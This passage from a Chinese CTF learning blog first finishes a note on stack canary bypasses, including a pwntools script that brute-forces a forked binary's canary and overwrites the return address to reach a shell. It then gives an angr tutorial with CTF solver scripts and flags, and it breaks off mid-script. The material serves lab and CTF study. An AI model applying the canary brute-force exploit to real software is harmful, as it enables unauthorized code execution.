class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>vuln()</code>中没有输出函数所以这里没有办法<code>leak</code>canary, 但主函数中有<code>fork()</code>函数可以进行canary爆破</p><p>这里我们还是编译为32位, 开启NX, Canary保护, 关闭 ALSR保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -m32 ex3.c -o ex3 -no-pie</span><br></pre></td></tr></table></figure><p>checksec:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/d/Users/Lantern/Desktop/note/pwn_note/canary/ex3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>爆破脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/zsh python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;ex3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ex3&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sl = p.sendline</span><br><span class="line">sd = p.send</span><br><span class="line"></span><br><span class="line">get_shell = ELF(<span class="string">&quot;./ex3&quot;</span>).sym[<span class="string">&quot;getshell&quot;</span>]</span><br><span class="line">ru(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot; : &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">        sd(<span class="string">&quot;a&quot;</span> * <span class="number">0x14</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = ru(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;success&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span> + canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">20</span> + <span class="built_in">str</span>.encode(canary) + <span class="string">b&quot;A&quot;</span> * <span class="number">12</span> + p32(get_shell)</span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  work python3 exp3.py</span><br><span class="line">[*] <span class="string">&#x27;/home/lantern/Desktop/work/ex3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ex3&#x27;</span>: pid 10924</span><br><span class="line">.....(爆破的输出)</span><br><span class="line">b<span class="string">&#x27;recv success\nwelcome\n&#x27;</span></span><br><span class="line">canary: \x00.E</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">ex3  exp3.py</span><br></pre></td></tr></table></figure><h4 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h4><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数, <code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数, 可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF 2017 Login, 利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表, 再进行 ROP 利用</p><h4 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h4><p>已知 Canary 储存在 TLS 中, 在函数返回前会使用这个值进行对比。当溢出尺寸较大时, 可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参见 StarCTF2018 babystack</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr</title>
      <link href="/note-tool-angr/"/>
      <url>/note-tool-angr/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>angr是一个Python实现的二进制分析框架, 实现了程序插桩、符号执行等二进制分析技术, 项目的GitHub:<a href="https://github.com/angr/angr">https://github.com/angr/angr</a></p><ul><li>这里主要是我angr的学习历程, 请各位师傅斧正</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://docs.angr.io/introductory-errata/install">官方文档</a></p><p>根据文档, angr会修改<code>libz3</code>和<code>libVEX</code>, 会影响其他程序的正常使用, 因此官方推荐使用 Python 虚拟环境<code>virtualenvwrapper</code></p><h3 id="Ubuntu18-04-虚拟机"><a href="#Ubuntu18-04-虚拟机" class="headerlink" title="Ubuntu18.04 虚拟机"></a>Ubuntu18.04 虚拟机</h3><h4 id="安装virtualenvwrapper"><a href="#安装virtualenvwrapper" class="headerlink" title="安装virtualenvwrapper"></a>安装virtualenvwrapper</h4><p><a href="https://virtualenvwrapper.readthedocs.io/en/latest/">virtualenwrapper 官方文档</a></p><p>我的环境是Ubuntu18.04, 根据官方文档一把梭</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ pip3 install virtualenvwrapper</span><br><span class="line">...</span><br><span class="line">➜  ~ <span class="built_in">export</span> WORKON_HOME=~/Envs</span><br><span class="line">➜  ~ mkdir -p <span class="variable">$WORKON_HOME</span></span><br><span class="line">➜  ~ VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line">➜  ~ <span class="built_in">source</span> /home/lantern/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br><span class="line">....</span><br><span class="line">➜  ~ mkvirtualenv env1</span><br><span class="line">....</span><br><span class="line">(env1) ➜  ~</span><br></pre></td></tr></table></figure><p>这里就是我安装的全过程, 由于环境原因一开始找不到<code>/usr/local/bin/virtualenvwrapper.sh</code>, 后面又因为我默认是python2所以找不到<code>virtualenvwrapper</code>模块, 但都解决了。</p><h4 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h4><p>接下来退出<code>env1</code>, 安装<code>angr</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">source</span> /home/lantern/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br><span class="line">➜  ~ mkvirtualenv --python=$(<span class="built_in">which</span> python3) angr &amp;&amp; python -m pip install angr</span><br></pre></td></tr></table></figure><p>成功安装后, 就可以使用<code>angr</code>了:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  ~ python3</span><br><span class="line">Python 3.6.9 (default, Apr 18 2020, 01:56:04)</span><br><span class="line">[GCC 8.4.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import angr</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="WSL-Ubuntu18-04"><a href="#WSL-Ubuntu18-04" class="headerlink" title="WSL Ubuntu18.04"></a>WSL Ubuntu18.04</h3><h4 id="安装virtualenvwrapper-1"><a href="#安装virtualenvwrapper-1" class="headerlink" title="安装virtualenvwrapper"></a>安装virtualenvwrapper</h4><p><a href="https://gist.github.com/fedme/442e7d1d7eb7d68e02cfbf6441d42759">https://gist.github.com/fedme/442e7d1d7eb7d68e02cfbf6441d42759</a> 跟着这篇文章即可</p><h4 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h4><p>指定为python3</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkvirtualenv angr --python=python3</span><br></pre></td></tr></table></figure><h4 id="安装angr-1"><a href="#安装angr-1" class="headerlink" title="安装angr"></a>安装angr</h4><p>一把梭</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m pip install angr</span><br></pre></td></tr></table></figure><h3 id="加入路径-WSL"><a href="#加入路径-WSL" class="headerlink" title="加入路径(WSL)"></a>加入路径(WSL)</h3><p>由于每次终端启动都得执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=~/.<span class="built_in">local</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> WORKON_HOME=~/.venvs</span><br><span class="line"><span class="built_in">source</span> ~/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br><span class="line"><span class="built_in">export</span> PIP_VIRTUALENV_BASE=~/.venvs</span><br></pre></td></tr></table></figure><ul><li><code>~/.local/bin/virtualenvwrapper.sh</code> 请替换为自己的路径</li></ul><p>所以可以将他们写入终端的配置文件, 这里我用的是<code>zsh</code>, 所以添加到<code>~/.zshrc</code>中, 添加到最后面即可, 这样每次启动终端的时候都会自动运行, 就可以愉快的用workon进入angr虚拟环境了~</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Desktop workon angr</span><br><span class="line">(angr) ➜  Desktop</span><br></pre></td></tr></table></figure><h2 id="跟着文档学使用"><a href="#跟着文档学使用" class="headerlink" title="跟着文档学使用"></a>跟着文档学使用</h2><p><a href="https://docs.angr.io/examples">https://docs.angr.io/examples</a>, 由于文档的题目我甚至看不懂, 这里先鸽了, 后期实力上升以后再来研究吧</p><p><a href="https://docs.angr.io/appendix/migration">https://docs.angr.io/appendix/migration</a> 这里是python2 和 python3的一些区别</p><h2 id="震惊！竟然在B站学angr"><a href="#震惊！竟然在B站学angr" class="headerlink" title="震惊！竟然在B站学angr"></a>震惊！竟然在B站学angr</h2><p><a href="https://www.bilibili.com/video/BV1Kt411f7h7">漏洞银行丨二进制自动化解题技术-蓝鲸塔主丨咖面64期</a>, B站大学名不虚传</p><h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p>符号执行就是在运行程序时, 用符号来替代真实值。符号执行相较于真实值执行的优点在于, 当使用真实值执行程序时, 我们能够遍历的程序路径只有一条, 而使用符号进行执行时, 由于符号是可变的, 我们就可以利用这一特性, 尽可能的将程序的每一条路径遍历, 这样的话, 必定存在至少一条能够输出正确结果的分支, 每一条分支的结果都可以表示为一个离散关系式, 使用约束求解引擎即可分析出正确结果。</p><h3 id="利用angr暴力求解"><a href="#利用angr暴力求解" class="headerlink" title="利用angr暴力求解"></a>利用angr暴力求解</h3><ul><li>装载二进制文件到到分析平台</li><li>转换二进制文件为中间语言(intermediate representation) (IR)</li><li>转换IR为语义描述(即它做什么而不是它是什么)</li><li>执行真正的分析, 这包括:<ul><li>部分或者全部的静态分析</li><li>对程序状态空间的符号探索</li><li>对上述的情况的一些混合</li></ul></li></ul><h3 id="装载二进制文件"><a href="#装载二进制文件" class="headerlink" title="装载二进制文件"></a>装载二进制文件</h3><p>angr的二进制装载组件是CLE, 它负责装载二进制对象(以及它依赖的任何库)和把这个对象以易于操作的方式交给angr的其他组件。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">b = angr.Project(<span class="string">&quot;ctf_game&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b.entry) // 程序入口点</span><br><span class="line"><span class="built_in">print</span>(b.loader.min_addr, b.loader.max_addr) // 该二进制文件在内存空间中的最小地址和最大地址</span><br><span class="line"><span class="built_in">print</span>(b.filename) // 文件的全名</span><br></pre></td></tr></table></figure><h3 id="中间语言"><a href="#中间语言" class="headerlink" title="中间语言"></a>中间语言</h3><p>由于angr需要处理很多不同的架构, 所以它必须选择一种中间语言(IR)来进行它的分析, 我们使用Valgrind的中间语言, VEX来完成这方面的内容。VEX中间语言抽象了几种不同架构间的区别, 允许在他们之上进行统一的分析</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/zjyy.jpg" alt="zjyy"></p><h3 id="基本使用流程"><a href="#基本使用流程" class="headerlink" title="基本使用流程"></a>基本使用流程</h3><ul><li><p>载入二进制程序, auto_load_libs 是设置是否自动加载外部动态链接</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./ctf_game&#x27;</span>, auto_load_libs = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li><li><p>然后获取当前的入口状态</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">state = proj.factory.entry_state()</span><br></pre></td></tr></table></figure></li><li><p>在获取到当前的入口状态后, 模拟执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simg = proj.factory.simgr(state)</span><br></pre></td></tr></table></figure></li><li><p>模拟执行后产生多种状态, 我们要选择最终要到达的（<code>find</code>）, 过滤掉不需要的(<code>avoid</code>)(具体例子看下面的练习)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simg.explore(find = <span class="number">0x400844</span>, avoid = <span class="number">0x400855</span>)</span><br></pre></td></tr></table></figure></li><li><p>获取最终的状态结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>) // dump(<span class="number">0</span>)表示从标准输入中获取字符串</span><br></pre></td></tr></table></figure></li></ul><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="练习1——无参"><a href="#练习1——无参" class="headerlink" title="练习1——无参"></a>练习1——无参</h4><p>由于没有找到视频中的题目, 我自己实现了一个简单的程序来练手, 代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> flag[<span class="number">9</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> check_str[] = <span class="string">&quot;aoeqh`gi&#123;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        flag[i] ^= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(flag, check_str) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">if</span> (fgets(flag, <span class="number">10</span>, <span class="built_in">stdin</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check(flag)) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;True!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;False&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag为<code>angrleans</code></p><p>IDA打开以后, 找到我们需要的和不需要的地址:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/angr1-we-need.jpg" alt="angr1-we-need"></p><p>使用脚本进行爆破:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr1&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x40086D</span>, avoid=<span class="number">0x40087B</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>运行脚本:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  r100 python3 s.py</span><br><span class="line">.....</span><br><span class="line">b<span class="string">&#x27;angrleans&#x27;</span></span><br></pre></td></tr></table></figure><p>正是我们的flag!</p><h4 id="练习2——带参"><a href="#练习2——带参" class="headerlink" title="练习2——带参"></a>练习2——带参</h4><p>对练习1的代码稍作修改:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> flag[<span class="number">9</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> check_str[] = <span class="string">&quot;aoeqh`gi&#123;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        flag[i] ^= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(flag, check_str) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Usage: angr2 your_flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (check(argv[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;True!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;False&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还是用IDA打开以后获取find和avoid, 然后编写脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr2&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">argv1 = claripy.BVS(<span class="string">&quot;argv1&quot;</span>, <span class="number">9</span> * <span class="number">8</span>) // 这里用的单位是bit, 因此需要乘以<span class="number">8</span></span><br><span class="line">state = proj.factory.entry_state(args=[<span class="string">&#x27;./angr2&#x27;</span>, argv1]) // 导入参数</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line"><span class="built_in">print</span>(simgr.explore(find=<span class="number">0x4007DC</span>, avoid=<span class="number">0x4007EA</span>))</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(argv1, cast_to=<span class="built_in">bytes</span>)) // 直接输出是<span class="built_in">ascii</span>码, 用cast_to=<span class="built_in">bytes</span>转为<span class="built_in">bytes</span>类型</span><br></pre></td></tr></table></figure><p>运行脚本:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  angr2 python3 s.py</span><br><span class="line">......</span><br><span class="line">&lt;SimulationManager with 1 active, 1 found&gt;</span><br><span class="line">b<span class="string">&#x27;angrleans&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="对下面用到的一些东西进行解释"><a href="#对下面用到的一些东西进行解释" class="headerlink" title="对下面用到的一些东西进行解释"></a>对下面用到的一些东西进行解释</h3><ul><li><code>claripy</code>: angr的求解引擎</li><li><code>claripy.BVS(&#39;password&#39;, 32)</code>: 创建一个32位的符号矢量</li><li><code>claripy.BVV(8, 32)</code>: 创建一个32位的矢量, 并初始化值为<code>8</code></li></ul><h3 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h3><h4 id="2018-网鼎杯-Matricks"><a href="#2018-网鼎杯-Matricks" class="headerlink" title="2018 网鼎杯 Matricks"></a>2018 网鼎杯 Matricks</h4><p>程序打开以后的流程如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// [rsp+Bh] [rbp-E5h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+14h] [rbp-DCh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> ia; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> n_23; <span class="comment">// [rsp+20h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">int</span> n_23a; <span class="comment">// [rsp+20h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+24h] [rbp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+28h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v15; <span class="comment">// [rsp+2Ch] [rbp-C4h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">56</span>]; <span class="comment">// [rsp+B0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v17; <span class="comment">// [rsp+E8h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+F0h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%49s&quot;</span>, flag);</span><br><span class="line">  v15 = <span class="number">1</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  n_23 = <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt;= <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)&amp;savedregs + <span class="number">7</span> * (n_23 / <span class="number">7</span>) + n_23 % <span class="number">7</span> - <span class="number">192</span>) = flag[i] ^ n_23;</span><br><span class="line">    *((_BYTE *)&amp;savedregs + <span class="number">7</span> * (i / <span class="number">7</span>) + i % <span class="number">7</span> - <span class="number">128</span>) = xor_bytes[n_23] ^ i;</span><br><span class="line">    ++i;</span><br><span class="line">    n_23 = (n_23 + <span class="number">13</span>) % <span class="number">49</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ia = <span class="number">41</span>;</span><br><span class="line">  v13 = <span class="number">3</span>;</span><br><span class="line">  v14 = <span class="number">4</span>;</span><br><span class="line">  v7 = <span class="number">5</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt;= <span class="number">6</span> &amp;&amp; v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt;= <span class="number">6</span> &amp;&amp; v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v8 &lt;= <span class="number">6</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 += *((_BYTE *)&amp;savedregs + <span class="number">7</span> * v7 + v14 - <span class="number">128</span>) * *((_BYTE *)&amp;savedregs + <span class="number">7</span> * v13 + v7 - <span class="number">192</span>);</span><br><span class="line">        ++v8;</span><br><span class="line">        v7 = (v7 + <span class="number">5</span>) % <span class="number">7</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( n_23a = <span class="number">17</span>; n_23a != ia; n_23a = (n_23a + <span class="number">11</span>) % <span class="number">49</span> )</span><br><span class="line">        ;</span><br><span class="line">      <span class="keyword">if</span> ( check_num[<span class="number">7</span> * (n_23a / <span class="number">7</span>) + n_23a % <span class="number">7</span>] != ((<span class="keyword">unsigned</span> __int8)n_23a ^ v4) )</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">      ia = (ia + <span class="number">31</span>) % <span class="number">49</span>;</span><br><span class="line">      ++v6;</span><br><span class="line">      v14 = (v14 + <span class="number">4</span>) % <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v5;</span><br><span class="line">    v13 = (v13 + <span class="number">3</span>) % <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v15 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;congrats!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很符合我们练习的第一题的题型, 直接爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./martricks&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x0000000000400A84</span>, avoid=<span class="number">0x0000000000400A90</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>这次就没有跑那么快了, 但是还是直接跑出了结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(angr) ➜  martricks_1 python3 s.py</span><br><span class="line"><span class="string">b&#x27;flag&#123;Everyth1n_th4t_kill5_m3_m4kes_m3_fee1_aliv3&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="2020-网鼎杯-Singal"><a href="#2020-网鼎杯-Singal" class="headerlink" title="2020 网鼎杯 Singal"></a>2020 网鼎杯 Singal</h4><p>具体分析看<a href="https://lantern.cool/wp-2020wd/">2020 网鼎 wp</a>, 这里只放angr爆破脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span 